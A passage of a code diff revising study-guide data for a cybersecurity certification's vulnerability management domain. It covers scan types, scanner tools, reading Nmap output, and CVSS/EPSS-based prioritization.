+          "Fragile or business-critical system, or you cannot risk disruption = passive. Need the most complete and accurate results = active, ideally in a maintenance window. Probes sent, ports scanned, or banners grabbed = active (banner grabbing connects to the service). Only watching traffic = passive.",
       },
       {
-        heading: "Scan Types - Internal vs External",
+        heading: "Scan Types: Internal vs External",
         explain:
-          "Scanning location determines what vulnerabilities you find and from whose perspective.",
+          "Where the scanner sits decides what it can see. Each view finds different problems.",
         points: [
-          "Internal Scan: Performed from within the organization's network to identify vulnerabilities that could be exploited by insiders or attackers who already have access.",
-          "External Scan: Performed from outside the organization's network to identify vulnerabilities that are visible and accessible from the internet.",
-          "Internal finds misconfigurations, weak internal security, insider threats. External finds exposed services, web app vulnerabilities, perimeter weaknesses.",
-          "Both are necessary for comprehensive security posture.",
+          "Internal scan: Run from inside the network to find issues an insider or an attacker who already got in could use, such as missing patches and weak configurations.",
+          "External scan: Run from the internet to find what an outside attacker can see, such as exposed services and perimeter weaknesses.",
+          "Use together: Both are needed for a full picture of exposure.",
         ],
         remember:
-          "Think of checking a house. External = walking around outside to see which doors and windows a burglar could try. Internal = walking through the rooms to check what a burglar could reach once inside, or what a guest could get into. You need both walks.",
+          "Checking a house. External = walking around outside to see which doors and windows a burglar could try. Internal = walking through the rooms to see what a burglar could reach once inside. You need both walks.",
         examTip:
-          "Insider threat, an attacker who already got in, or lateral movement = internal scan. Internet-facing website, firewall, or perimeter exposure = external scan. A question about what the public internet can see = external.",
+          "Insider threat, an attacker who already got in, or lateral movement = internal scan. Internet-facing website, firewall, or perimeter exposure = external scan. 'What can the public internet see?' = external. PCI DSS needs both.",
       },
       {
-        heading: "Scan Types - Agent-Based vs Agentless",
+        heading: "Scan Types: Agent vs Agentless",
         explain:
-          "Scanning method determines deployment complexity and depth of visibility.",
+          "This describes HOW the scanner collects data: with software on the device, or from across the network.",
         points: [
-          "Agent-Based Scan: Uses software installed directly on a device to collect detailed vulnerability and security information. Deep visibility but requires installation on each system.",
-          "Agentless Scan: Remotely assesses devices over the network without requiring software installation on the target systems. Easier deployment but less detailed.",
-          "Agents provide host-based information: running processes, installed software, local configurations, file integrity.",
-          "Agentless provides network-perspective: open ports, services, response patterns, network positioning.",
+          "Agent-based scan: A small program installed on each device collects detailed host information (installed software, local configuration, patch level) and reports back, even when the device is off the corporate network.",
+          "Agentless scan: A central scanner assesses devices over the network without installing anything. It is easier to deploy but sees less detail.",
+          "Common mix-up: Agentless scans can still be credentialed (using SSH, WMI, or SMB). 'Agent' and 'credentials' are different ideas.",
         ],
         remember:
-          "Agent = a security guard stationed inside each building who sees everything and reports back, even when the building is off the main road. Agentless = a patrol car driving past, checking each building from the street. The guard sees more, but you must hire one for every building.",
+          "An agent is a security guard stationed inside each building who sees everything and reports back, even when the building is off the main road. Agentless is a patrol car driving past and checking each building from the street. The guard sees more, but you must hire one for every building.",
         examTip:
-          "Cannot install software (legacy, OT, or locked-down devices) = agentless. Need deep host details like installed software and local configs, or the device is a remote laptop that is often off the network = agent-based. Easy, fast deployment across many devices = agentless.",
+          "Cannot install software (legacy, OT, locked-down devices) = agentless. Need deep host details, or remote laptops that are often off the network = agent-based. Fast deployment across many devices = agentless. Do not assume agentless means non-credentialed: they are separate questions.",
       },
       {
-        heading: "Scan Types - Credentialed vs Non-Credentialed",
+        heading: "Scan Types: Credentialed vs Non-Credentialed",
         explain:
-          "Scanning with or without authentication reveals different vulnerability categories.",
+          "This describes whether the scanner logs in to the target. Logging in reveals far more.",
         points: [
-          "Credentialed Scan: Uses authorized login credentials to access systems and perform a more detailed assessment of vulnerabilities and configurations. Sees what authenticated users see.",
-          "Non-Credentialed Scan: Evaluates systems without authentication and identifies vulnerabilities that are visible from an external/unauthenticated perspective.",
-          "Credentialed: Better coverage, finds config issues, sees installed software, checks permissions. Requires valid accounts and credential management.",
-          "Non-Credentialed: Simulates attacker with no access, finds exposed services, identifies weak authentication, tests default credentials.",
+          "Credentialed scan: Uses a valid account to inspect the system from the inside: patch levels, installed software, configuration, and permissions. It gives more accurate results and fewer false positives.",
+          "Non-credentialed scan: Has no login and sees only what an outside user could see, such as open ports and exposed services. It simulates an attacker with no access.",
+          "Protect the scan account: use least privilege, a strong secret in a vault, and restrict where it can be used.",
         ],
         remember:
-          "Non-credentialed = a stranger standing outside who can only see the front of the house. Credentialed = a home inspector with a key who can check the wiring, the attic, and the locks inside. The inspector finds far more problems.",
+          "Non-credentialed is a stranger standing outside who can only see the front of the house. Credentialed is a home inspector with a key who can check the wiring, the attic, and the locks inside. The inspector finds far more problems.",
         examTip:
-          "What could an outside attacker see = non-credentialed. Need accurate results, missing patches, or configuration problems = credentialed (and it usually gives fewer false positives). Too many false positives or missed patches in scan results = switch to credentialed. Protect the scan account with least privilege.",
+          "'What could an outside attacker see?' = non-credentialed. Missing patches, configuration problems, or too many false positives in results = switch to credentialed. A scanner account with domain admin rights is a risk, so use least privilege.",
       },
       {
         heading: "Discovery Scanning",
         explain:
-          "Discovery scanning identifies what exists in your network before detailed vulnerability scanning.",
+          "Before checking for vulnerabilities, discover what exists on the network and what each thing is.",
         points: [
-          "Discovery: Identifies devices, hosts, services, applications, and resources that exist within a network environment. First step in reconnaissance.",
-          "Mapping Scans: Creates a visual or logical representation of network devices, connections, and communication paths. Essential for understanding network topology.",
-          "Device Fingerprinting: Identifies the operating system, software version, device type, or hardware characteristics of a target system. Helps prioritize scanning strategy.",
+          "Discovery scan: Finds live hosts, services, and applications on a network. It is the first step and feeds the asset inventory.",
+          "Mapping scans: Build a picture of devices and how they connect, showing topology and communication paths.",
+          "Device fingerprinting: Identifies the operating system, software version, or device type from how it responds.",
         ],
         remember:
-          "Think of exploring a new city. Discovery = finding out which buildings exist. Mapping = drawing the streets that connect them. Fingerprinting = reading the sign on each building to learn what it is (a bank, a school, a warehouse). Do this before you inspect anything in detail.",
+          "Exploring a new city. Discovery = finding out which buildings exist. Mapping = drawing the streets that connect them. Fingerprinting = reading the sign on each building to learn what it is (bank, school, warehouse). Do this before inspecting anything in detail.",
         examTip:
-          "Which hosts and services are alive on the network = discovery scan. Draw the network layout or connections = mapping scan. Identify the OS or device type from how it responds = device fingerprinting. Discovery comes first, and its results feed your asset inventory and your deeper scans.",
+          "Which hosts and services are alive = discovery scan. Draw the network layout and connections = mapping scan. Identify the OS or device type from how it responds = device fingerprinting. Discovery comes first, then vulnerability scanning.",
       },
       {
         heading: "Security Baseline Scanning",
         explain:
-          "Baseline scanning compares system configurations against established security standards.",
+          "A baseline scan checks whether systems match an approved secure standard.",
         points: [
-          "Security Baseline Scanning: Compares system configurations against established security standards to identify deviations and weaknesses.",
-          "PCI DSS (Payment Card Industry Data Security Standard): Security standard defining requirements for protecting credit card information. Requires regular vulnerability assessments.",
-          "CIS Benchmarks (Center for Internet Security): Industry-recognized security configuration guidelines providing recommendations for securely configuring systems and applications.",
-          "ISO 27000 Series: Collection of international standards providing guidance for establishing and maintaining information security management systems.",
-          "Baseline scanning ensures compliance with industry standards and best practices.",
+          "Security baseline scanning: Compares system settings against a defined standard to find deviations (configuration drift).",
+          "PCI DSS: Payment Card Industry Data Security Standard. Requirements for protecting cardholder data, including regular vulnerability scans.",
+          "CIS Benchmarks: Center for Internet Security secure-configuration guides for operating systems, browsers, cloud platforms, and applications.",
+          "ISO 27000 series: International standards for an information security management system. ISO 27001 is the certifiable standard.",
         ],
         remember:
-          "A baseline is a report card. The standard is the answer key, and the scan grades your systems against it. PCI DSS = the answer key for card payments. CIS Benchmarks = the answer key for hardening settings. ISO 27000 = the answer key for the whole security program.",
+          "A report card. The standard is the answer key, and the scan grades your systems against it. PCI DSS = the answer key for card payments. CIS Benchmarks = the answer key for hardening settings. ISO 27000 = the answer key for the whole security program.",
         examTip:
-          "Credit card data = PCI DSS. Secure configuration settings for an OS, browser, or cloud platform = CIS Benchmarks. Company-wide security management system or certification = ISO 27001 (part of the ISO 27000 series). A system that has drifted from its approved settings = baseline deviation.",
+          "Credit card data = PCI DSS. Secure configuration settings for an OS or cloud platform = CIS Benchmarks. Company-wide security management system or certification = ISO 27001 (part of the ISO 27000 series). A system that has drifted away from approved settings = baseline deviation.",
       },
     ],
   },
-
   {
     id: "domain-2-2",
     title: "Analyzing Output from Vulnerability Assessment Tools",
     domain: "Domain 2.0",
     domainName: "Vulnerability Management",
     module: "2.2",
-    moduleName: "Vulnerability Analysis",
+    moduleName: "Vulnerability Tool Output",
     description:
-      "Network scanners, multipurpose tools, web application scanners, vulnerability scanners, cloud assessment tools, breach and attack simulation tools, and how to read scan output.",
-    lastUpdated: "Oct 13, 2026",
+      "Network scanners, Nmap and other multipurpose tools, web application scanners, vulnerability scanners, cloud assessment tools, breach and attack simulation, and how to read scan output.",
+    lastUpdated: "2026-10-19",
     access: "Free",
-    icon: Search,
-    estimatedTime: "1 hours",
+    icon: AlertTriangle,
+    estimatedTime: "90 minutes",
     sections: [
       {
         heading: "Network Scanning and Mapping",
         explain:
-          "Network scanning tools discover which devices are alive on a network and which ports are open on them. They show what is reachable, which is the first step before any deeper vulnerability testing.",
+          "These tools find which devices are alive and which ports are open. That shows what is reachable, not what is wrong inside.",
         points: [
-          "Angry IP Scanner: Angry IP Scanner is a fast network scanning tool used to identify active devices, open ports, and basic network information across an IP address range.",
-          "Masscan: Masscan is a high-speed port scanner capable of scanning large networks and identifying open ports much faster than traditional scanning tools.",
+          "Angry IP Scanner: A fast, simple scanner that finds active hosts and open ports in an IP range.",
+          "Masscan: A very high-speed port scanner that can scan huge ranges quickly.",
         ],
         remember:
-          "Think of counting which lights are on in a huge apartment block. Angry IP Scanner = a quick walk past to see which windows are lit. Masscan = a helicopter flying over the whole city at once. Both tell you what is on, not what is wrong inside.",
+          "Counting which lights are on in a huge apartment block. Angry IP Scanner = a quick walk past to see which windows are lit. Masscan = a helicopter flying over the whole city at once. Both tell you what is on, not what is wrong inside.",
         examTip:
-          "Scan a huge range or the whole internet as fast as possible = Masscan. Simple, quick check of which hosts are alive in an IP range = Angry IP Scanner. Both only show live hosts and open ports, so they do not replace a vulnerability scanner.",
+          "Scan a huge range as fast as possible = Masscan. Simple, quick check of which hosts are alive in a range = Angry IP Scanner. Both show live hosts and open ports only; they do not replace a vulnerability scanner. Fast scans can overload fragile devices.",
       },
       {
         heading: "Multipurpose Tools",
         explain:
-          "These tools do several jobs in one: discovery, reconnaissance, and exploit testing. Analysts use them to map a target and to prove whether a weakness can really be used.",
+          "These tools combine discovery, reconnaissance, and exploitation in one toolkit.",
         points: [
-          "Nmap: Nmap (Network Mapper) is a network discovery and security auditing tool used to identify hosts, open ports, running services, operating systems, and potential vulnerabilities.",
-          "Metasploit Framework (MSF): The Metasploit Framework is a penetration testing platform used to validate vulnerabilities, test exploits, and assess security weaknesses in systems.",
-          "Maltego: Maltego is an intelligence-gathering and link-analysis tool used to discover relationships between people, domains, IP addresses, organizations, and other entities.",
-          "Recon-ng: Recon-ng is an open-source reconnaissance framework that automates information gathering and OSINT collection during security assessments.",
+          "Nmap: Discovers hosts, open ports, service versions, and operating systems, and can run scripts (NSE) for further checks.",
+          "Metasploit Framework (MSF): A penetration testing framework that validates vulnerabilities by safely exploiting them. Practice targets such as Metasploitable are used in labs.",
+          "Maltego: A link-analysis tool that draws relationships between people, domains, IPs, and organizations.",
+          "Recon-ng: An open-source reconnaissance framework that automates OSINT collection.",
         ],
         remember:
-          "Think of a detective's kit. Nmap = the map and magnifying glass that shows hosts, ports, services, and operating systems. Metasploit = the lock-picking set that proves a door can really be opened. Maltego = the corkboard with red string linking people, domains, and IPs. Recon-ng = the assistant who searches public sources for you.",
+          "A detective's kit. Nmap = the map and magnifying glass that shows hosts, ports, services, and operating systems. Metasploit = the lock-picking set that proves a door can really be opened. Maltego = the corkboard with red string. Recon-ng = the assistant who searches public sources for you.",
         examTip:
-          "Identify hosts, open ports, service versions, and the OS = Nmap. Prove a vulnerability is real by exploiting it (validation) = Metasploit. Visual relationships between domains, IPs, and people = Maltego. Automated OSINT collection = Recon-ng. Metasploit exploits systems, so use it only with written authorization.",
+          "Hosts, open ports, service versions, and OS = Nmap. Prove a vulnerability is real by exploiting it = Metasploit (only with written authorization). Visual relationships between domains, IPs, and people = Maltego. Automated OSINT collection = Recon-ng.",
+      },
+      {
+        heading: "Reading Nmap Output",
+        explain:
+          "The exam gives you scan output and asks what it means. Learn the common flags and the three port states.",
+        points: [
+          "Common flags: -sS (SYN scan), -sV (service versions), -O (OS detection), -sU (UDP scan), -Pn (skip host discovery, treat host as up), -p- (all 65535 ports), -A (aggressive: OS, version, scripts, traceroute).",
+          "Open: A service is listening and accepting connections.",
+          "Closed: The port is reachable, but nothing is listening.",
+          "Filtered: A firewall or filter blocks the probe, so Nmap cannot tell whether the port is open.",
+          "Risk reading: Unneeded open services (telnet, FTP, SMB exposed to the internet), old version numbers, and unexpected ports are the findings to report.",
+        ],
+        remember:
+          "Knocking on doors. Open = someone answers. Closed = nobody home but the door is reachable. Filtered = a guard at the gate swallows your knock and says nothing. Version numbers tell you how old the lock is.",
+        examTip:
+          "'Filtered' means a firewall is in the way, not that the port is closed. Need to know what software and version is running = -sV. Host blocks ping and you still want to scan it = -Pn. Telnet (23) or FTP (21) open = insecure cleartext protocols. A version known to be vulnerable is a finding even if the scanner did not flag it.",
       },
       {
         heading: "Web Application Scanners",
         explain:
-          "Web application scanners test websites and web servers for flaws in the application code and in the server it runs on, such as injection, weak authentication, and outdated components.",
+          "These tools test websites and web servers for flaws in the application code and in the server it runs on.",
         points: [
-          "Burp Suite: Burp Suite is a web application security testing platform used to identify vulnerabilities such as SQL injection, cross-site scripting (XSS), and authentication weaknesses.",
-          "Zed Attack Proxy (ZAP): ZAP is an open-source web application scanner that helps identify security vulnerabilities in web applications through automated and manual testing.",
-          "Nikto: Nikto is a web server scanner that identifies dangerous files, outdated software, misconfigurations, and known web server vulnerabilities.",
+          "Burp Suite: A web testing platform with an intercepting proxy to inspect and modify requests, and scanners for SQL injection, XSS, and authentication weaknesses.",
+          "Zed Attack Proxy (ZAP): A free, open-source web application scanner and intercepting proxy for automated and manual testing.",
+          "Nikto: A web server scanner that finds dangerous files, outdated server software, and misconfigurations.",
         ],
         remember:
-          "Think of three inspectors for a shop. Burp Suite = the professional who stands between you and the shop, reads and changes every message, and tests the checkout for tricks. ZAP = the same job done by a free community inspector. Nikto = the building inspector who checks the shop's structure for dangerous leftovers and old parts.",
+          "Three inspectors for a shop. Burp Suite = the professional who stands between you and the shop, reads and changes every message, and tests the checkout for tricks. ZAP = the same job done by a free community inspector. Nikto = the building inspector who checks the structure for dangerous leftovers and old parts.",
         examTip:
-          "SQL injection, XSS, or intercepting and modifying web requests = Burp Suite or ZAP. Free and open-source web app scanner = ZAP. Outdated server software, dangerous default files, or web server misconfiguration = Nikto. Nikto checks the web server, while Burp and ZAP test the web application.",
+          "SQL injection, XSS, or intercepting and modifying web requests = Burp Suite or ZAP. Free and open-source web app scanner = ZAP. Outdated server software, default files, or web server misconfiguration = Nikto. Nikto checks the web SERVER; Burp and ZAP test the web APPLICATION.",
       },
       {
         heading: "Vulnerability Scanners",
         explain:
-          "Vulnerability scanners compare systems and applications against large databases of known flaws and report missing patches, weak settings, and exposed software. They are the main tools for finding known weaknesses at scale.",
+          "These tools compare systems with large databases of known flaws and report missing patches and weak settings.",
         points: [
-          "Nessus: Nessus is a vulnerability assessment tool that scans systems and applications for security weaknesses, missing patches, and configuration issues.",
-          "Nuclei: Nuclei is a template-based vulnerability scanner that uses predefined templates to quickly identify known vulnerabilities and security exposures.",
-          "Open Vulnerability Assessment Scanner (OpenVAS): OpenVAS is an open-source vulnerability scanning solution that detects security flaws, outdated software, and misconfigurations across network assets.",
+          "Nessus: A widely used commercial vulnerability scanner for missing patches and misconfigurations. Findings are rated Critical, High, Medium, Low, and Info.",
+          "Nuclei: A fast scanner that uses community-written templates, each checking for one specific known issue.",
+          "Open Vulnerability Assessment Scanner (OpenVAS): A free, open-source vulnerability scanner.",
+          "Reading results: Each finding has a severity, a CVE or plugin ID, the affected host and port, and a recommended fix. Validate important findings.",
         ],
         remember:
-          "Think of a doctor's checkup. Nessus = the well-known clinic that tests for many known conditions. OpenVAS = a free community clinic doing a similar checkup. Nuclei = a quick test strip: each template checks for exactly one known problem, so new tests can be added fast.",
+          "A doctor's checkup. Nessus = the well-known clinic that tests for many known conditions. OpenVAS = a free community clinic doing a similar checkup. Nuclei = a quick test strip: each template checks for exactly one known problem, so new tests can be added fast.",
         examTip:
-          "Missing patches, configuration issues, and a broad commercial scanner = Nessus. Free and open-source network vulnerability scanner = OpenVAS. Fast scanning with community-written templates for a specific known flaw = Nuclei. Scanner results can include false positives, so validate important findings.",
+          "Missing patches and configuration issues from a broad commercial scanner = Nessus. Free open-source scanner = OpenVAS. Quick scanning with community templates for a specific new flaw = Nuclei. An 'Info' finding is not a vulnerability. A scanner finding is a lead to verify, not proof, because false positives happen.",
       },
       {
         heading: "Cloud Infrastructure Assessment Tools",
         explain:
-          "Cloud assessment tools check cloud accounts, containers, and Infrastructure as Code for risky settings, exposed secrets, and compliance gaps. Many can catch problems before anything is deployed.",
+          "These tools check cloud accounts, containers, and Infrastructure as Code for risky settings, exposed secrets, and compliance gaps.",
         points: [
-          "ScoutSuite: ScoutSuite is a multi-cloud security auditing tool that evaluates cloud environments and identifies security risks and misconfigurations.",
-          "Prowler: Prowler is a cloud security assessment tool that evaluates environments against security best practices, compliance standards, and configuration benchmarks.",
-          "Trivy: Trivy is a security scanner used to detect vulnerabilities, secrets, and misconfigurations in containers, Kubernetes environments, code repositories, and cloud resources.",
-          "Checkov: Checkov is an Infrastructure as Code (IaC) security scanner that identifies misconfigurations and compliance violations before resources are deployed.",
+          "ScoutSuite: A multi-cloud auditing tool that reports risky configuration across providers.",
+          "Prowler: Checks a cloud account against security best practices and compliance benchmarks (such as CIS).",
+          "Trivy: Scans container images, Kubernetes, code repositories, and IaC for vulnerabilities, secrets, and misconfigurations.",
+          "Checkov: Scans Infrastructure as Code (such as Terraform) for misconfigurations before deployment.",
         ],
         remember:
-          "Think of building a house. Checkov = checking the blueprint before any bricks are laid. Trivy = inspecting the delivered materials (container images) for rot and hidden keys. ScoutSuite = a survey of the finished neighborhood across several cities. Prowler = a compliance inspector with a checklist.",
+          "Building a house. Checkov = checking the blueprint before any bricks are laid. Trivy = inspecting the delivered materials (container images) for rot and hidden keys. ScoutSuite = a survey of the finished neighborhood across several cities. Prowler = a compliance inspector with a checklist.",
         examTip:
-          "Audit more than one cloud provider = ScoutSuite. Check a cloud account against benchmarks and compliance standards = Prowler. Scan container images, Kubernetes, or repos for vulnerabilities and exposed secrets = Trivy. Find misconfigurations in Terraform or other IaC before deployment = Checkov (shift left: fix it before it goes live).",
+          "Audit more than one cloud provider = ScoutSuite. Check a cloud account against CIS or compliance benchmarks = Prowler. Scan container images or repos for vulnerabilities and exposed secrets = Trivy. Find misconfigurations in Terraform before deployment = Checkov ('shift left': fix it before it goes live).",
       },
       {
         heading: "Breach and Attack Simulation (BAS) Tools",
         explain:
-          "Breach and Attack Simulation (BAS) tools simulate real-world attack scenarios to test the effectiveness of security defenses. They do not hunt for vulnerabilities. They check whether your detection and response actually work.",
+          "BAS tools do not look for vulnerabilities. They test whether your defenses detect and stop real attacker techniques.",
         points: [
-          "Atomic Red Team: Atomic Red Team is a collection of small, controlled security tests that simulate real-world attacker techniques to validate detection and response capabilities.",
-          "Caldera: Caldera is an automated adversary emulation platform that simulates attacker behavior based on MITRE ATT&CK techniques to test security defenses.",
+          "Atomic Red Team: A library of small, individual tests, each simulating one ATT&CK technique, to check that a detection or control works.",
+          "Caldera: An automated adversary emulation platform that chains techniques into a realistic multi-step attack based on ATT&CK.",
         ],
         remember:
-          "Think of a fire drill. Atomic Red Team = lighting one small, safe flame to see if one smoke alarm goes off. Caldera = running a whole automated drill that acts out a realistic fire from start to finish. The point is to test whether your alarms and your team react.",
+          "A fire drill. Atomic Red Team = lighting one small, safe flame to see if one smoke alarm goes off. Caldera = running a whole automated drill that acts out a realistic fire from start to finish. The point is to test whether your alarms and your team react.",
         examTip:
-          "Small, individual tests of one attacker technique to check a detection rule = Atomic Red Team. Automated, multi-step adversary emulation based on MITRE ATT&CK = Caldera. If the question asks whether the SOC detects an attack technique, think BAS, not a vulnerability scanner.",
+          "A small test of one technique to check a detection rule = Atomic Red Team. Automated, multi-step adversary emulation = Caldera. 'Does our SOC detect this technique?' = BAS, not a vulnerability scanner. Run BAS with approval and in a controlled way.",
       },
     ],
   },
-
   {
     id: "domain-2-3",
-    title: "Analyzing Data to Prioritize Vulnerabilities",
+    title: "Analyzing Data to Prioritize and Mitigate Vulnerabilities",
     domain: "Domain 2.0",
     domainName: "Vulnerability Management",
     module: "2.3",
     moduleName: "Vulnerability Prioritization",
     description:
-      "Prioritization criteria, true and false positives, CVSS and EPSS scoring, context awareness, mitigation strategies, compensating controls, and validation of remediation.",
-    lastUpdated: "Oct 13, 2026",
+      "Prioritization criteria, true and false results, CVSS and EPSS scoring, context awareness, mitigation strategies, compensating controls, and validation of remediation.",
+    lastUpdated: "2026-10-19",
     access: "Free",
     icon: ListOrdered,
-    estimatedTime: "1.5 hours",
+    estimatedTime: "90 minutes",
     sections: [
       {
         heading: "Prioritization Criteria",
         explain:
-          "No team can fix every vulnerability at once. Analysts rank findings by how easy they are to exploit, whether attackers are using them, what is at stake, and whether a fix exists.",
+          "No team can fix everything at once. Analysts rank findings by how easily they can be exploited, whether attackers use them, and what is at stake.",
         points: [
-          "Exploitability: Exploitability is the measure of how easily an attacker can successfully take advantage of a vulnerability.",
-          "Active Exploitation/Threat Intelligence: A vulnerability becomes a higher priority when threat intelligence shows that attackers are actively exploiting it in real-world attacks.",
-          "Asset Value: Asset value refers to the importance of a system, application, or data to business operations and security.",
-          "Impact: Impact measures the amount of damage a vulnerability could cause if it is successfully exploited.",
-          "Patch/Remediation Availability: Patch or remediation availability indicates whether a fix, update, or mitigation exists to address the vulnerability.",
+          "Exploitability: How easily an attacker can use the flaw (remote, no login needed, public exploit code).",
+          "Active exploitation and threat intelligence: Evidence that attackers are using the flaw now, such as inclusion in CISA's Known Exploited Vulnerabilities (KEV) catalog.",
+          "Asset value: How important the system or data is to the business.",
+          "Impact: How much damage a successful attack would cause.",
+          "Patch and remediation availability: Whether a fix or workaround exists.",
         ],
         remember:
-          "Think of a hospital emergency room. Nurses do not treat patients in the order they arrived. They triage: how bad is it (impact), how fast is it getting worse (active exploitation), how easy is it to treat (exploitability), who is the patient (asset value), and is a treatment available (patch). Treat the most urgent first.",
+          "A hospital emergency room triages patients: how bad is it (impact), how fast is it getting worse (active exploitation), how easy is it to treat (exploitability), who is the patient (asset value), and is a treatment available (patch). Treat the most urgent first, not the first to arrive.",
         examTip:
-          "Threat intel says a flaw is being used in attacks right now = move it to the top of the list. A medium-score flaw on a critical server that holds customer data can outrank a high-score flaw on a test machine. No patch available = use mitigations or compensating controls instead of waiting.",
+          "Threat intel says a flaw is exploited right now = move it to the top. A medium-score flaw on a critical server with customer data can outrank a high-score flaw on a test machine. No patch available = use mitigations or compensating controls. Do not prioritize by CVSS alone.",
       },
       {
         heading: "True and False Results",
         explain:
-          "Scanners are not perfect. Every result is either right or wrong, and analysts must know which kind of mistake they are looking at.",
+          "Scanners are not perfect. Every result is right or wrong in one of four ways.",
         points: [
-          "True Positives: A true positive occurs when a security tool correctly identifies a real vulnerability.",
-          "False Positives: A false positive occurs when a security tool incorrectly reports a vulnerability that does not actually exist.",
-          "True Negatives: A true negative occurs when a security tool correctly determines that a vulnerability is not present.",
-          "False Negatives: A false negative occurs when a security tool fails to detect an existing vulnerability, creating a hidden security risk.",
+          "True positive: A real vulnerability is correctly reported.",
+          "False positive: A vulnerability is reported but does not exist.",
+          "True negative: No vulnerability exists and none is reported.",
+          "False negative: A real vulnerability exists but the scanner missed it.",
         ],
         remember:
-          "Think of a smoke alarm. True positive = fire and the alarm rings. False positive = burnt toast and the alarm rings. True negative = no fire and no alarm. False negative = a real fire and the alarm stays silent. The silent alarm during a real fire is the dangerous one.",
+          "A smoke alarm. True positive = fire and the alarm rings. False positive = burnt toast and the alarm rings. True negative = no fire and no alarm. False negative = a real fire and the alarm stays silent. The silent alarm during a real fire is the dangerous one.",
         examTip:
-          "Scanner reports a flaw that is not there = false positive (wastes time, validate before acting). Scanner misses a real flaw = false negative, which is the most dangerous because nobody knows the risk exists. Fix false negatives with credentialed scans, updated plugins, and a second tool. Fix false positives by manually validating findings.",
+          "Scanner reports a flaw that is not there = false positive (wastes time; validate manually). Scanner misses a real flaw = false negative, the most dangerous because nobody knows the risk exists. Fix false negatives with credentialed scans, updated plug-ins, and a second tool. Fix false positives by validating findings.",
       },
       {
-        heading: "Scoring Methods",
+        heading: "Scoring Methods: CVSS",
         explain:
-          "Scoring systems turn vulnerabilities into numbers so teams can compare and rank them. CVSS measures how severe a flaw is, and EPSS measures how likely it is to be exploited.",
+          "CVSS turns the technical severity of a flaw into a number from 0 to 10 so flaws can be compared.",
         points: [
-          "Common Vulnerability Scoring System (CVSS) Metrics: CVSS is a standardized scoring system that rates the severity of vulnerabilities based on factors such as exploitability, impact, and complexity.",
-          "Base Metrics: Base metrics measure the inherent characteristics of a vulnerability that remain constant over time and across environments.",
-          "Temporal Metrics: Temporal metrics measure factors that can change over time, such as exploit availability and remediation status.",
-          "Environmental Metrics: Environmental metrics measure the impact of a vulnerability within a specific organization's environment.",
-          "Exploit Prediction Scoring System (EPSS): EPSS is a predictive scoring model that estimates the likelihood that a vulnerability will be exploited in the near future.",
+          "Common Vulnerability Scoring System (CVSS): A standard way to rate severity. Ratings: None 0.0, Low 0.1 to 3.9, Medium 4.0 to 6.9, High 7.0 to 8.9, Critical 9.0 to 10.0.",
+          "Base metrics: Inherent qualities that do not change, such as Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and the impact on Confidentiality, Integrity, and Availability (C, I, A).",
+          "Temporal metrics: Factors that change over time, such as exploit code availability and patch status. CVSS 4.0 renames this group 'Threat'.",
+          "Environmental metrics: Adjustments for your own environment, such as how important the asset is and what controls exist.",
         ],
         remember:
-          "Think of a storm warning. CVSS = how strong the storm is if it hits (severity). EPSS = the chance it will hit your town this week (likelihood). Base = the storm's strength on paper. Temporal = how the forecast changes as time passes (exploit code appears, a patch is released). Environmental = how bad it is for your town specifically.",
+          "A storm warning. CVSS is how strong the storm is if it hits. Base = the storm's strength on paper. Temporal = how the forecast changes as time passes (exploit code appears, a patch is released). Environmental = how bad it is for your town specifically.",
         examTip:
-          "Memory tip: CVSS = how severe? EPSS = how likely? Score never changes and is the same everywhere = base. Changes as exploits appear or patches are released = temporal. Adjusted for your own systems and controls = environmental. Best practice is to combine CVSS, EPSS, and your own asset context, not rely on a single number.",
+          "Score that never changes and is the same everywhere = base. Changes as exploits appear or patches are released = temporal. Adjusted for your own systems and controls = environmental. AV:N (network) means exploitable remotely, which is worse than AV:L (local). PR:N means no login needed. Combine CVSS with threat intel and asset context rather than relying on one number.",
+      },
+      {
+        heading: "Scoring Methods: EPSS",
+        explain:
+          "CVSS says how bad a flaw could be. EPSS says how likely it is to be attacked.",
+        points: [
+          "Exploit Prediction Scoring System (EPSS): A model that estimates the probability (0 to 1, or 0 to 100 percent) that a vulnerability will be exploited in the wild in the next 30 days.",
+          "Using it with CVSS: A flaw with a high CVSS and a high EPSS is urgent. A high CVSS with a very low EPSS may wait behind more likely threats.",
+          "Active exploitation: A flaw listed in CISA KEV is already being exploited, whatever its score.",
+        ],
+        remember:
+          "A weather service reports two things: how strong the storm is (CVSS) and the chance it will hit your town this week (EPSS). A mild storm that is certain to hit can be more urgent than a huge storm that will almost surely miss.",
+        examTip:
+          "CVSS = how severe? EPSS = how likely to be exploited? A question asking which tool helps focus on flaws attackers are likely to exploit soon = EPSS. Known exploited = highest priority. Best practice combines CVSS, EPSS, asset value, and context.",
       },
       {
         heading: "Context Awareness",
         explain:
-          "The same vulnerability can be a crisis on one system and a minor issue on another. Where a system sits on the network changes its real risk.",
+          "The same flaw can be a crisis on one system and a minor issue on another. Network location changes real risk.",
         points: [
-          "Internal: An internal vulnerability exists within the organization's network and generally requires internal access to exploit.",
-          "External: An external vulnerability exists on internet-facing systems that can be reached directly by outside attackers.",
-          "Isolated: An isolated vulnerability exists on systems with limited connectivity, reducing the chance of exploitation.",
+          "Internal: Systems inside the network. An attacker usually needs internal access first.",
+          "External: Internet-facing systems that anyone can reach directly.",
+          "Isolated: Systems with little or no connectivity (air-gapped or tightly restricted), which are harder to reach.",
         ],
         remember:
-          "Think of a leaky window. On the front of the house facing the street (external), anyone walking by can use it. In an interior room (internal), a burglar must get into the house first. In a locked vault with no way in (isolated), it barely matters. Same flaw, very different urgency.",
+          "A leaky window. On the street-facing front of the house (external), anyone walking by can use it. In an interior room (internal), a burglar must get into the house first. In a locked vault with no way in (isolated), it barely matters. Same flaw, very different urgency.",
         examTip:
-          "Same CVSS score on an internet-facing web server and an isolated lab machine = patch the external one first. Isolated or air-gapped systems lower the priority but do not remove the vulnerability. Questions that give you network location are hinting that context decides the order.",
+          "Same CVSS score on an internet-facing web server and an isolated lab machine = fix the external one first. Isolation lowers priority but does not remove the vulnerability (removable media can still bring in an attack). A question that gives you network location is hinting that context decides the order.",
       },
       {
         heading: "Mitigation Strategies",
         explain:
-          "Once vulnerabilities are ranked, teams choose how to reduce the risk. The best fix is a patch, but when that is not possible, other controls and formal risk decisions fill the gap.",
+          "After ranking, the team decides how to reduce risk. The best answer is a patch, but when that is impossible, other controls and formal decisions fill the gap.",
         points: [
-          "Attack Surface Management: Attack surface management is the ongoing process of identifying and reducing potential entry points that attackers can use to compromise systems.",
